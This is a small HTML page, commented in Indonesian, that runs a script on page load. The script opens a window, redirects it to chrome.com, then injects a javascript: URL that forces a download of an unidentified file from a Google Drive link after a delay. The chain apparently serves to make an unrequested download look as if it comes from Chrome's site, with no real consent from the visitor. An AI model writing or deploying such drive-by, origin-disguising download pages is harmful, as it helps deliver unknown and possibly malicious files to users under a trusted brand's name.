<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirect + Delay Download</title>

  <script>
    function chainRedirect(w, urls, index = 0) {
      if (index < urls.length) {
        console.log("Redirecting to:", urls[index]);

        w.location.replace(urls[index]);

        // kalau ini URL terakhir (download)
        if (index === urls.length - 1) return;

        setTimeout(() => {
          chainRedirect(w, urls, index + 1);
        }, 500);
      }
    }

    function startRedirect() {
      let w = window.open("");

      // delay awal sebelum mulai redirect
      setTimeout(() => {
        chainRedirect(w, [
          "https://chrome.com",

          // delay 5 detik sebelum download
          "javascript:setTimeout(function(){location.href='https://drive.usercontent.google.com/download?at=AGN2oQ0VkjDRWTpZ7Vs-SmKiGHJ6:1773905849768&authuser=0&confirm=t&export=download&id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL&uuid=733afb2e-0d6c-4da7-8ec5-883d0b792a34'},2000)"
        ]);
      }, 300);
    }
  </script>
</head>

<body onload="startRedirect()">
  <h3>Loading... Download akan dimulai dalam 2 detik</h3>
</body>
</html>
